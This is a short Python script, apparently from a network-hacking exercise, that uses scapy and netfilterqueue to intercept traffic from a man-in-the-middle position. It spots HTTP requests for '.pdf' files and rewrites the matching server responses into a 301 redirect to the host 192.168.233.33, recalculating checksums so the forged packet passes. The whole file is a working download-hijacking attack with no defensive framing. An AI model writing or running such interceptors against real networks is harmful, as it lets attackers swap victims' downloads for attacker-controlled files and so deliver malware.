#!/usr/bin/env pyhton3

import scapy.all as scapy
import netfilterqueue

ack_list = []


def packets(packect):
    pack = scapy.IP(packect.get_payload())
    if pack.haslayer(scapy.Raw):
        if pack.haslayer(scapy.TCP):
            if pack[scapy.TCP].dport == 80:
                if '.pdf' in pack[scapy.Raw].load.decode('utf-8', errors='ignore'):
                    ack_list.append(pack[scapy.TCP].ack)
                    print("[+] Http request")
            elif pack[scapy.TCP].sport == 80:
                if pack[scapy.TCP].seq in ack_list:
                    ack_list.remove(pack[scapy.TCP].seq)
                    print("[+] Http response changing")
                    pack[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://192.168.233.33"
                    del pack[scapy.IP].len
                    del pack[scapy.IP].chksum
                    del pack[scapy.TCP].chksum
                    packect.set_payload(bytes(pack))
    packect.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, packets)
queue.run()
